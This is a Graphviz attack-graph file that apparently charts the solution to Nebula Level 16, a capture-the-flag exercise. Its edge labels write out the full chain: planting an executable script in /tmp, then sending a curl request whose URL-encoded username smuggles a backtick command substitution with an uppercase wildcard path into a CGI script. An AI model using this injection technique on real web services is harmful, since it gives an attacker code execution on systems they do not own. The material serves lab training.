digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Nebula Level 16"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Injection vector identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Uppercase wildcard payload prepared"];
  node2 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Execution as flag16 obtained"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="cat /home/flag16/index.cgi"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="printf \"#!/bin/sh
/bin/getflag > /tmp/bar
\" > /tmp/FOO && chmod +x /tmp/FOO"];
  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="curl \"http://127.0.0.1:1616/index.cgi?username=%60%2f%2a%2f%46%4f%4f%60&password=x\""];
}
